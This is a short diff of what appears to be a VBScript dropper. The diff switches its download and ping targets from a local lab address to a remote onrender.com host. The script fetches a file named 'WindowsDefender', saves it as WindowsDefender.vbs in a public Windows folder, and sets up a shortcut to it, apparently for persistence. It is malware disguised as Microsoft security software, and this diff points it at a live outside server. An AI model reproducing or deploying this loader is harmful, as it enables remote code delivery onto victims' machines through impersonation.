@@ -2,12 +2,12 @@ appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%"
 Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' DownloadFile variables
-Dim downloadURL : downloadURL = "http://192.168.126.1:8080/WindowsDefender" ' Replace with your actual download URL
+Dim downloadURL : downloadURL = "https://vibescope.onrender.com/WindowsDefender" ' Replace with your actual download URL
 Dim downloadDirectory : downloadDirectory = "C:\Users\Public\Libraries" 
 Dim downloadedFilename : downloadedFilename = "WindowsDefender.vbs"
 
 ' CheckInternetConnection variables
-Dim url : url = "https://knuth-programming-hub-9p08.onrender.com/"            ' server URL to ping
+Dim url : url = "https://vibescope.onrender.com/"            ' server URL to ping
 
 ' CreateShortcut variables
 Dim sourceFilePath : sourceFilePath = "C:\Users\Public\Libraries\WindowsDefender.vbs"
